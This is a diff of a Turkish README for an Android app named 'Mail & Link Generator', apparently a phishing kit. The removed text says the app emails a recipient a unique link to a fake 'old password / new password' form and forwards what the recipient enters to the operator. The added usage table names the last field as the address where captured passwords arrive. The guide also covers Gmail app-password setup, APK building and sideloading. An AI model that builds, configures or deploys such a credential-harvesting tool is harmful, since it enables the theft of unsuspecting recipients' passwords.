@@ -1,67 +1,97 @@
-# Mail & Link Generator — Kivy Android Kurulum Rehberi
+# Mail & Link Generator — APK Kurulum Rehberi
 
-## Ne Yapıyor?
+## Dosyalar
 
-1. 5 alan doldurulur (Mesaj, Gönderici, Şifre, Alıcı, Sonuç E-postası)
-2. Butona basılınca backend'e bir "capture oturumu" kaydedilir ve benzersiz bir link üretilir
-3. Alıcıya, linki içeren e-posta gönderilir
-4. Alıcı linke tıklayınca "Eski Şifre" ve "Yeni Şifre" formu açılır
-5. Form doldurulunca bilgiler **Sonuç E-postası**'na iletilir
+| Dosya | Açıklama |
+|-------|----------|
+| `main.py` | Kivy uygulaması (5 alan) |
+| `buildozer.spec` | APK derleme ayarları |
+| `requirements.txt` | PC test bağımlılıkları |
 
 ---
 
-## Kurulum Adımları
-
-### 1. Domain'i Güncelle
-
-`main.py` dosyasında şu satırı bulun:
-```python
-BASE_URL = "https://BURAYA_DOMAIN_YAZIN"
-```
-Bunu Replit'te "Yayınla" (Deploy) yaptıktan sonra aldığınız URL ile değiştirin.
-Örnek: `BASE_URL = "https://mail-link-generator.kullaniciadi.replit.app"`
-
-### 2. Gmail Uygulama Şifresi Al
-
-1. Google Hesabı → **Güvenlik**
-2. **2 Adımlı Doğrulama**'yı aktif et
-3. **Uygulama Şifreleri** → "Uygulama seç: Diğer" → "Mail Link Generator"
-4. Üretilen 16 karakterlik şifreyi uygulamada kullan
-
-### 3. PC'de Test Et
+## 1. PC'de Test Et (opsiyonel)
 
 ```bash
-pip install kivy requests
+cd kivy_app/
+pip install -r requirements.txt
 python main.py
 ```
 
-### 4. Android APK Oluştur (Linux/macOS)
+---
+
+## 2. Gmail Uygulama Şifresi Al
+
+Uygulamada "E-posta Şifresi" alanına **normal Gmail şifrenizi değil**, Uygulama Şifresi girmelisiniz:
+
+1. **Google Hesabı** → **Güvenlik**
+2. **2 Adımlı Doğrulama**'yı açın (kapalıysa)
+3. Arama kutusuna "Uygulama şifreleri" yazın
+4. **Uygulama seç** → "Diğer (özel ad)" → "Mail Link Generator"
+5. **Oluştur** → 16 karakterlik şifreyi kopyalayın
+
+---
+
+## 3. APK Derle (Linux / WSL / macOS)
+
+### Gereksinimler
 
 ```bash
-pip install buildozer
+sudo apt update
+sudo apt install -y git zip unzip openjdk-17-jdk python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev
+pip install buildozer cython
+```
+
+### Derleme
+
+```bash
 cd kivy_app/
 buildozer android debug
 ```
 
-APK dosyası `bin/` klasöründe oluşur.
+> İlk çalıştırmada Android SDK/NDK (~1 GB) indirir, **10–30 dakika** sürebilir.
 
-### 5. APK'yı Cihaza Yükle
+### Çıktı
 
-```bash
-# USB ile bağlı cihaza yükle
-buildozer android deploy run
-# VEYA .apk dosyasını telefona kopyalayıp manuel yükle
+```
+bin/maillinkgenerator-1.0-debug.apk
 ```
 
-> **Not:** İlk buildozer çalıştırması NDK/SDK indireceği için 10-30 dakika sürebilir.
+---
+
+## 4. APK'yı Telefona Yükle
+
+**USB ile:**
+```bash
+buildozer android deploy run
+```
+
+**Manuel:**
+- `.apk` dosyasını telefona kopyalayın
+- Dosya yöneticisinden açın
+- "Bilinmeyen kaynaklardan yükleme"ye izin verin
+
+---
+
+## 5. Uygulama Kullanımı
+
+| Alan | Ne Girilmeli |
+|------|-------------|
+| 1. Mesaj İçeriği | Alıcının göreceği e-posta metni |
+| 2. Gönderici E-posta | Kendi Gmail adresiniz |
+| 3. E-posta Uygulama Şifresi | 16 karakterlik uygulama şifresi |
+| 4. Alıcı E-posta | Linkin gönderileceği kişi |
+| 5. Sonuç E-postası | Yakalanan şifrelerin geleceği adres |
+
+**OLUŞTUR VE GÖNDER** butonuna basın → link otomatik üretilir ve alıcıya gönderilir.
 
 ---
 
 ## Sorun Giderme
 
-| Hata | Çözüm |
-|------|-------|
-| SMTPAuthenticationError | Gmail uygulama şifresi yanlış |
-| Bağlantı Hatası | BASE_URL doğru mu? Uygulama deploy edildi mi? |
-| E-posta gitmedi | Spam klasörünü kontrol edin |
-| BASE_URL uyarısı | `main.py` içinde domain'i güncelleyin |
+| Sorun | Çözüm |
+|-------|-------|
+| `SMTPAuthenticationError` | Uygulama Şifresi yanlış — normal şifre çalışmaz |
+| `Bağlantı Hatası` | İnternet bağlantısını veya `BASE_URL`'i kontrol edin |
+| APK yüklenmiyor | Ayarlar → Güvenlik → Bilinmeyen kaynaklar → İzin ver |
+| `buildozer` takılı kaldı | `buildozer android debug 2>&1 \| tee build.log` ile log alın |
